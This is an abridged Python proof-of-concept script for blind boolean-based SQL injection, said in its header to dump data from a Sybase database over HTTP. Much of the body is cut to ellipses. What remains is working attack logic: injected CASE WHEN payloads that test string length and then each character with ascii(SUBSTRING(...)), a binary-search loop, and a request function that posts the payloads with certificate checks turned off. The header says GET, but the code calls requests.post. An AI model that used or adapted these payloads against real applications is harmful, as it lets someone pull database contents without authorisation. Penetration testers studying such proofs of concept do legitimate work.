################################################################################################
#  Description:  
#  A rough HTTP GET based POC for dumping results from an Sybase database 
...
def get_str_length(query, start_ord, end_ord):
    ...
    while True:
        ...
        data = "MARSH' and (SELECT (CASE WHEN (len((%s))>%d) THEN (2) ELSE (1) END))=1--" % (query, mid)
...
def make_request( addr, data ):      
    ...
    while True:
        #Send request
        try:
            r = requests.post(addr, data = param_dict, proxies=proxies, verify=False, headers=headers)
            break
...
def get_string(str_len, query, start_ord, end_ord):
    ...
    while( len(full_str) < str_len ):
        ...
        while True:
            ...
            #Construct query
            data = "A' and (SELECT (CASE WHEN ((ascii(SUBSTRING((%s),%s,1)))>%d) THEN (2) ELSE (1) END))=1--" % (query, counter, mid)
            ret = make_request(url, data) 
            if ret == None:
                break
